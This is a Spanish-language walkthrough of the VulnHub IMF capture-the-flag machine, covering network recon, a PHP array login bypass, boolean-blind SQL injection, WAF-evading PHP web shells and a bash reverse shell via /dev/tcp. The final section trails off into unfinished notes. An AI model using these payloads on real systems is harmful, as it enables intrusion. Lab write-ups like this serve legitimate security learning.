---
title: "VulnHub: IMF"
date: 2025-10-31
tags:
  - writeup
  - vulnhub
  - sqli
  - privilege-escalation
  - web-exploitation
  - BoF
related:
  - "[[SQLi-Manual]]"
  - "[[Git-Reconnaissance]]"
  - "[[Linux-Privesc]]"
  - "[[SSH-Techniques]]"
references:
  - https://www.vulnhub.com/entry/imf-1,162/
---
![[CTFIMF.Cover.png]]
# Información General  
>Este documento contiene información detallada de cómo comprometer la máquina IMF en VulnHub. Se abordan principalmente las técnicas: **SQLi Boolean Blind** y **Buffer Overflow**.
---
## Objetivos
- Comprometer la máquina virtual [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/).
- Obtener acceso inicial mediante enumeración web.
- Escalar privilegios hasta root mediante abuso de servicios vulnerables.
- Capturar las 6 flags.
## Técnicas Aplicadas
- **Reconocimiento de Red**: Identificación de objetivos mediante ARP y TCP  
- **Enumeración de Servicios**: Detección de versiones y aplicaciones  
- **Análisis Manual de Código**: Identificación de secretos en código fuente  
- **SQL Injection Boolean-Based**: Automatización de explotación  
- **Bypass de WAF**: Inserción de payloads en archivos GIF  
- **Reverse Shell**: Obtención de acceso remoto  
- **Port Knocking**: Acceso a servicios protegidos  
- **Buffer Overflow**: Escalada de privilegios  
### Entorno de Trabajo
Este writeup fue realizado bajo las siguientes condiciones:
- **Hipervisor**: VMware Workstation Pro
- **Sistema Operativo Host**: Arch Linux
- **Máquina Atacante**: Kali Linux (virtualizada)
- **Máquina Objetivo**: IMF 1 (VulnHub)
- **Red**: vmnet1 (Red privada de VMware)
## Herramientas y Comandos Usados

| Herramienta | Función principal                             |
| ----------- | --------------------------------------------- |
| arp-scan    | Descubre hosts en la red.                     |
| nmap        | Escaneo y enumeración de puertos y servicios. |
| Burp Suite  | Análisis y pruebas de tráfico web.            |
| curl        | Transferencia de datos y pruebas HTTP.        |
| TCPing      | Verifica conectividad TCP sin ICMP.           |
| netcat      | Utilidad multipropósito de red.               |
| ssh         | Acceso remoto seguro por consola.             |
| htop        | Monitorización avanzada de procesos.          |
| netstat     | Revisión de conexiones y puertos activos.     |
| ltrace      | Rastreo de llamadas de biblioteca.            |
| gdb         | Depurador para análisis de binarios.          |

---
# Solución General

> [!Abstract] Resumen Técnico  
> Este writeup guía paso a paso cómo explotar una máquina Linux vulnerable mediante inyección SQL Boolean-Based y Buffer Overflow. El objetivo es enseñar cómo funcionan estas vulnerabilidades desde una perspectiva práctica y educativa.

## 1. Reconocimiento:  

La fase de **reconocimiento** es el cimiento de cualquier pentest exitoso. Durante esta etapa:

- **Identificamos el alcance**: Qué máquinas y servicios tenemos como objetivo
- **Mapeamos la infraestructura**: Entendemos cómo se conectan los sistemas
- **Detectamos servicios**: Encontramos qué aplicaciones están corriendo y en qué versiones

Sin reconocimiento adecuado, **disparamos a la oscuridad**. Con él, nos movemos con precisión quirúrgica.
### 1.1 Fase Inicial | arp-scan y tcping

Lo primero que hago es reconocer qué máquina voy a atacar. Para ello, debo identificar la IP de la máquina víctima, esto se hace con ayuda de la herramienta `arp-scan`.

**¿Qué es ARP?** Address Resolution Protocol (ARP) es un protocolo que mapea direcciones IP a direcciones MAC en una red local. Cuando una máquina quiere comunicarse con otra en la misma red, primero necesita saber su dirección MAC. ARP hace exactamente eso.

Comando utilizado:
```bash
arp-scan -I vmnet1 --localnet
```

Parámetros:
- `arp-scan`: Herramienta de reconocimiento de red
- `-I`: Especifica el adaptador de red a escanear
- `--localnet`: Indica escaneo de toda la red local

![[CTFIMF.00.png]]
Este escaneo me identifica la máquina objetivo en "`172.16.23.129`" dentro de mi red `vmnet1`.

Identificamos que hay una máquina, por lo que podemos ejecutar el comando ping para verificar conección con la máquina:

```bash
ping 172.16.23.129
```
![[CTFIMF.01.png]]
No hay conexión por medio de ping.

**¿Por qué falla ping?** El comando "ping" usa el protocolo ICMP (Internet Control Message Protocol), que envía paquetes de eco para saber si un dispositivo está accesible en la red. Sin embargo, muchos sistemas o firewalls pueden bloquear estos paquetes ICMP por seguridad, por lo que "ping" puede fallar aunque el dispositivo esté activo.

Al no obtener respuesta con ICMP, probaremos la herramienta [tcping](https://github.com/cloverstd/tcping) para verificar la conexión mediante el protocolo TCP. `tcping` usa TCP para intentar establecer una conexión directa a un puerto específico en la máquina destino (por ejemplo, puerto 80, 443, etc.). Esto permite verificar si un servicio en ese puerto está disponible y funcionando, sin depender de que ICMP esté permitido.

Una vez compilada, ejecutamos:
```bash
./tcping 172.16.23.129
```
![[CTFIMF.02.png]]

Confirmamos conexión con `172.16.23.129` por medio de la herramienta tcping.
### 1.2 Escaneo de puerto |  nMap
```bash
nmap -p- --open -sS 172.16.23.129 -T4 -n -vvv -Pn -oA SYNscan 
```

Parámetros:
- `-p-`: Escanea todos los puertos TCP del host, del puerto 1 al 65535.
- `--open`: Solo muestra los puertos que están abiertos, ignorando los cerrados o filtrados.
- `-sS`: Realiza un escaneo SYN stealth (Half-open scan), que envía paquetes SYN para detectar puertos abiertos sin completar la conexión TCP (menos detectable).
- `-T4`: Ajusta la velocidad del escaneo a un nivel agresivo (más rápido, menos sigiloso).
- `-n`: No resuelve nombres DNS para las IPs, acelera el escaneo al evitar consultas DNS.
- `-vvv`: Muestra salida muy detallada (nivel de verbosidad triple).
- `-Pn`: No realiza ping previo para detectar si el host está activo; asume que está activo y escanea directamente.
- `-oA SYNscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "SYNscan".

![[CTFIMF.03.png]]

### 1.3 Escaneo de servicios | nmap

Ya que sabemos que tenemos el puerto 80 abierto, es el momento de utilizar un conjunto de scripts de reconocimiento que tiene nmap que nos permitirá identificar exactamente a qué nos estamos enfrentando con información más detallada.

Comando utilizado:
```bash
nmap -p80 -sCV 172.16.23.129 -oA PORTscan   
```
Parámetros:
- `-p80`: Escanea específicamente el puerto 80.
- `-sCV`: Detecta servicios (`-sV`) y ejecuta scripts de reconocimiento básicos (`-sC`).
- `-oA PORTscan`: Exporta la salida en tres formatos simultáneamente.


![[CTFIMF.04.png]]

Resultado: Equipo con puerto 80/tcp abierto, servicio Apache httpd 2.4.18 corriendo en máquina Ubuntu | Aplicación web: IMF

### 1.4 Reconocimiento Web | Puerto 80

Introducimos la IP `172.16.23.129` como URL en nuestro navegador web y vemos que la misma cuenta con 3 "secciones":
- **Home** (index.php)
- **Projects** (projects.php)
- **Contact Us** (contact.php)

![[CTFIMF.05.png]]

#### Código Fuente | Index.php 
![[CTFIMF.06.png]]

Encontramos unos segmentos de JavaScript encriptados en base64. Esto es bastante curioso de ver en un código fuente, porque cuando juntamos todos los segmentos obtenemos la cadena: "`ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==`"

> Base64 es un esquema de codificación que convierte datos binarios en texto ASCII. Se usa comúnmente para transmitir datos que no pueden ser enviados directamente (como credenciales o datos binarios) a través de protocolos que solo aceptan texto.

Se identifica fácilmente que es una cadena base64, por lo que procedemos a decodificarla:
```bash
 echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d; echo
```

![[CTFIMF.07.png]]
Resultado: `flag2{aW1mYWRtaW5pc3RyYXRvcg==}`

Esta es otra cadena base64, vamos a decodificarla nuevamente:
```bash
echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d; echo
```
![[CTFIMF.08.png]]
Resultado: **imfadministrator** - Esto parece ser una ruta o directorio administrativo.
#### Código Fuente | projects.php

![[CTFIMF.09.png]]
Aquí no hay mucho que ver, parece una página con solo información relacionada a los proyectos de la aplicación web. No contiene datos sensibles.
#### Código Fuente | contact.php

![[CTFIMF.10.png]]
Esta página es mucho más interesante que las otras dos. En el formulario vemos claramente tres posibles usuarios por lo que los guardamos, seguramente sirven para más tarde.

![[CTFIMF.11.png]]
Además, en su código fuente encontramos la `flag1{YWxsdGhlZmlsZXM=}`. Vemos que también está en `base64` por lo que procedemos a decodificarla:
```bash
echo "YWxsdGhlZmlsZXM=" | base64 -d; echo
```
![[CTFIMF.12.png]]
Resultado: **allthefiles** - Pista que nos sugiere revisar todos los archivos.
#### Recuento de Información:

> [!success] Flags Capturadas: 
> - `flag1{allthefiles}`
> - `flag2{imfadministrator}`

> [!success] Usuarios Identificados: 
> - Roger S. Michaels: rmichaels@imf.local
> - Alexander B. Keith: akeith@imf.local
> - Elizabeth R. Stone: estone@imf.local
---

## 2. Explotación

Podemos intuir que las flags son pistas para seguir con el reto. En este caso:
- "`flag1{allthefiles}`" nos invita a revisar todos los archivos del aplicativo
- "`flag2{imfadministrator}`" nos indica lo que parece ser un directorio administrativo

Confirmamos esto ingresando en la URL: `http://172.16.23.129/imfadministrator/`
![[CTFIMF.13.png]]
Parece un panel de inicio de sesión administrativo. Este es el momento perfecto para probar los usuarios que habíamos encontrado anteriormente, confirmando no solo que los usuarios existen, sino que **la web también es vulnerable a enumeración de usuarios**.

![[CTFIMF.14.png]]
Revisando el código fuente también podemos ver pistas en los comentarios de la web. Parece que dejaron toda la sanitización en el traste por lo que ya podemos a probar cosas con el Repeater de BurpSuite.
### 2.1 Array Injection Authentication Bypass |  BurpSuite

![[CTFIMF.15.png]]
Con un simple `[]` (corchetes vacíos) en el parámetro de login podemos ver que la web nos da acceso al panel administrativo. Esto ocurre porque:

> En PHP, cuando usas `[]` en un formulario GET o POST, conviertes un parámetro de string en un array. El backend espera un string y lo compara directamente, pero recibe un array. Dependiendo de cómo se escribe el código, esta comparación fallida puede resultar en un bypass de autenticación. Es un ejemplo clásico de cómo las suposiciones sobre el tipo de datos pueden llevar a vulnerabilidades.

Al presionar con el payload `[]` el sistema nos concede acceso y nos entrega la **flag3**: `flag3{Y29udGludWVUT2Ntcw==}`

Decodificamos:
```bash
echo "Y29udGludWVUT2Ntcw==" | base64 -d; echo
```
![[CTFIMF.16.png]]
Resultado: **continueTOcms** - Nueva pista hacia el CMS.
### 2.2 Panel Administrativo CMS
También tenemos un enlace que nos lleva a `http://172.16.23.129/imfadministrator/cms.php?pagename=home` por lo que al ingresar podemos ver el contenido del panel administrativo:

**Secciones disponibles:**
- Home
- Upload Report
- Disavowed list

![[CTFIMF.17.png]]
![[CTFIMF.18.png]]
![[CTFIMF.19.png]]
![[CTFIMF.20.png]]
No hay nada interesante en los códigos fuentes de estas páginas a simple vista. Sin embargo, hay algo crucial que pasamos por alto...

## 3. Preparativos para el Ataque - SQL Injection Boolean Blind

### 3.1 Identificación de la Vulnerabilidad

Nos damos cuenta de que la página tiene un parámetro interesante: `cms.php?pagename=home`. 

![[CTFIMF.21.png]]
Ese `=` es bastante curioso ya que está apuntando a recursos, por lo que vamos a probar colocando una comilla `'` (comilla simple). Esto nos da una pantalla **WARNING** de **SQL**, confirmando que hay una inyección SQL:
![[CTFIMF.22.png]]
### 3.2 Concepto: SQL Injection Boolean Blind

> SQLi es una vulnerabilidad donde un atacante inyecta código SQL malicioso en los campos de entrada de una aplicación. Si la entrada no está sanitizada, el código ejecuta consultas SQL no autorizadas.
- **Boolean**: La respuesta es sí o no (true/false)
- **Blind**: No vemos directamente los resultados de la base de datos

En un **SQL Injection Boolean Blind**, no podemos ver los datos de la base de datos como lo haríamos en un Error-Based SQLi. En su lugar, nos basamos en diferencias de comportamiento:
- Si nuestra condición es **TRUE**, la página muestra cierto contenido/comportamiento
- Si nuestra condición es **FALSE**, muestra otro contenido/comportamiento

**¿Cómo funciona?** Comparamos dos estados:
```
-- Estado TRUE
pagename=home' AND '1'='1'--
La página carga normalmente

-- Estado FALSE  
pagename=home' AND '1'='0'--
La página muestra un error o contenido diferente
```

Con esto, podemos "preguntar" a la base de datos letra por letra, extrayendo **información sin necesidad ver nunca los datos directamente**.
### 3.3 Pruebas Manuales de Boolean SQLi

Interceptamos la solicitud GET con Burp Suite:
```
GET /imfadministrator/cms.php?pagename=home' or 1=1--
```

El payload de la imagen está URL-encoded al enviar las solicitudes, puedes hacerlo fácilmente con Burp Suite al presionar `Ctrl + U`.

![[CTFIMF.23.png]]

Notamos que la solicitud en sí no cambia mucho visualmente, pero al leer detenidamente podemos apreciar que hay un error que dice:

```
mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in 
```

Este error es un **claro indicio** de que hay un **error relacionado a parámetros booleanos**, confirmando una vulnerabilidad Boolean SQLi.

```
mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in 
```

#### Confirmación de Boolean SQLi

Con esto podemos identificar que hay una base de datos trabajando con SQL, ademas vemos ese **bolean given in** es un claro indicio a que hay un error relacionado a parámetros booleanos, teniendo esto en cuenta vamos a probar los payload: dando el servidor respuestas distintas y confirmando **boolean sqli** 

hora probamos dos payloads específicos para confirmar el comportamiento booleano:

**Payload TRUE (debe cargar la página normalmente):**
```
home' AND '1'='1'--
```
![[CTFIMF.24.png]]

**Payload FALSE (debe mostrar un error o comportamiento diferente):**
```
home' AND '1'='0'--
```
![[Pasted image 20251102010623.png]]

Con esto en cuenta podemos ver claramente dos respuestas distintas, confirmando la vulnerabilidad **Boolean Blind SQLi**.

### 3.4 Extracción Manual de Información

Por ejemplo, podemos empezar a cambiar las solicitudes por palabras:

```
home' AND 'test'='test'--
```

![[CTFIMF.25.png]]
De esta forma tenemos una forma de identificar entradas en las bases de datos. A pesar de que no veamos exactamente la entrada, tenemos una forma de ir buscando información.

Supongamos que queremos buscar bases de datos, podemos usar una de las entradas para seleccionar mediante queries nombres de las mismas e ir fuzzeando las misma.
### 3.5 Descubrimiento de Esquemas de Base de Datos

Como sabemos que es una base de datos trabajando bajo SQL podemos probar solicitudes que apunten a nombres comunes de las mismas, por ejemplo `mysql` o `information_schema`.

> information_schema es una base de datos especial en MySQL que contiene metadatos sobre TODAS las demás bases de datos, tablas, columnas, etc. Es como el "índice" de la base de datos.

Usamos el payload
```
home' AND (SELECT schema_name FROM information_schema.schemata limit 0,1)='information_schema-- HTTP/1.1
```
**Desglose**:
- `SELECT schema_name`: Selecciona nombre del esquema
- `FROM information_schema.schemata`: De la tabla de esquemas
- `limit 0,1`: Primer resultado
- `='information_schema'`: ¿Es igual a esto?


**Estado FALSE** (nombre incorrecto):
![[CTFIMF.26.png]]

**Estado TRUE** (confirmamos information_schema existe):
![[Pasted image 20251102174257.png]]
✅ Confirmado: existe la BD `information_schema`.

### 3.6 Fuzzing letra por letra

El verdadero poder: extraer información **desconocida**. En lugar de buscar nombres completos, **fuzzeamos letra por letra**.

**El concepto**: Usamos `substring()` para extraer caracteres uno a uno:

```sql
home' AND (SELECT substring(schema_name,1,1) FROM information_schema.schemata limit 0,1)='i--
```
**Desglose**:
- `substring(schema_name,1,1)`: Primera letra del nombre
- `limit 0,1`: Primera BD
- `='i'`: ¿Es igual a "i"?

Fíjate como ahora  seleccionamos la **primera letra** de la **primera base de datos**, sabemos que la primera BD es `information_schema`, cuya primera letra es **"i"** → **TRUE**:
![[CTFIMF.27.png]]
Para la segunda letra: `substring(schema_name,2,1)='n'` y así sucesivamente.

**¿Por qué funciona?** La función `substring()` extrae N caracteres desde una posición. Si probamos 'i', es TRUE. Si probamos 'x', es FALSE. **Letra por letra extraemos cualquier información**.

---
## 4. Automatización - Script Python

Hacer esto manualmente es **tedioso**. Un script automatiza el proceso:

**Mi Script**: https://github.com/NeTenebraes/neBooleanBlindSQLi

El script:
1. Define el parámetro vulnerable
2. Itera sobre caracteres ASCII
3. Para cada posición, prueba cada carácter
4. Si respuesta = TRUE, guarda carácter
5. Continúa hasta completar la cadena

**Resultado**: Encontramos página oculta: `http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete`

Si quieres ver exactamente como funciona este script y estos conceptos, te recomiendo que visite el [repositorio](https://github.com/NeTenebraes/neBooleanBlindSQLi).

--- 
**Resultado**: Encontramos página oculta: `http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete`

![[CTFIMF.28.png]]
Hay un QR. Lo escaneamos con herramienta web segura:

**QR Decodificado**: `flag4{dXBsb2Fkcjk0Mi5waHA=}`

![[Pasted image 20251106033449.png]]
```bash
echo "dXBsb2Fkcjk0Mi5waHA=" | base64 -d; echo
```

**Resultado**: **uploadr942.php** ← Una página oculta de carga de archivos.

## 5. Bypass WAF y Reverse Shell

### 5.1 Acceso al Uploader

Navegamos a `http://172.16.23.129/imfadministrator/uploadr942.php`:
![[CTFIMF.29.png]]

Se pueden subir imágenes. Necesitamos **bypassear el WAF** (Web Application Firewall).

**¿Qué es un WAF?** Un Web Application Firewall filtra y monitoriza tráfico HTTP/HTTPS. Bloquea solicitudes maliciosas basándose en reglas como:
- Extensiones de archivo (.php prohibido)
- MIME types
- Contenido del archivo

**¿Cómo bypasseamos?** Usamos **magic numbers** o **file signatures**.

![[CTFIMF.30.png]]


CREAR UNA FUNCION CON LOGICA
```
<?php
$f = 'sy'.'stem';
	$f($_GET['cmd']);
?>
```

COMILLA INVERTIRA
```
<?php
$command=$_GET['cmd'];
	echo `$command`;
?> 
```

htaccess con php en gif

hice ls y cat con curl a 
```
flag5{YWdlbnRzZXJ2aWNlcw==}
```



nos ponemos en escucha

usamos el payload

"bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'

el & es un carade nalgas entonces nos toca URL encodearlo con %26

y logramos conexion 


#### Estabilización de TTY

Comandos para estabilizar la shell:
```
/usr/bin/script -qc /bin/bash /dev/null
```
Luego CTRL+Z y ejecutar:
```
stty raw -echo; fg
```
Finalmente:
```
export TERM=xterm
```

ecnontramos agent gracias a la pista de flag

hay un binario,

aplicamos ltrace para ver recorrido,

comparamos

buffer over flow

mvfvenom para crear payload

script de python con socket



TUVE QUE HACER UN KNOCK qY EJECUTAR EL ARCHIVO DIRECTAMENTE EN MI PC

flag6{R2gwc3RQcm90MGMwbHM=}



---


## Resumen de Flags Capturadas

| Flag       | Contenido          | Ubicación                   | Técnica                 |
| ---------- | ------------------ | --------------------------- | ----------------------- |
| **Flag 1** | `allthefiles`      | contact.php - Código Fuente | Análisis manual         |
| **Flag 2** | `imfadministrator` | index.php - Código Fuente   | Decodificación Base64   |
| **Flag 3** | `ContinuesTOcms`   | IMF CMS                     | Enumeración de usuarios |
| **Flag 4** | `uploadr942.php`   | QR code en CMS              | Decodificación QR       |
| **Flag 5** | `agentservices`    | Shell web                   | SQLi + Web shell        |
| **Flag 6** | `Gh0stProt0c0ls`   | /root/flag6.txt             | Buffer Overflow         |
## Referencias

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Buffer Overflow Exploitation](https://owasp.org/www-community/attacks/Buffer_Overflow)
- [VulnHub IMF Machine](https://www.vulnhub.com/entry/imf-1,162/)
- [Nmap Official Documentation](https://nmap.org/book/)
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)

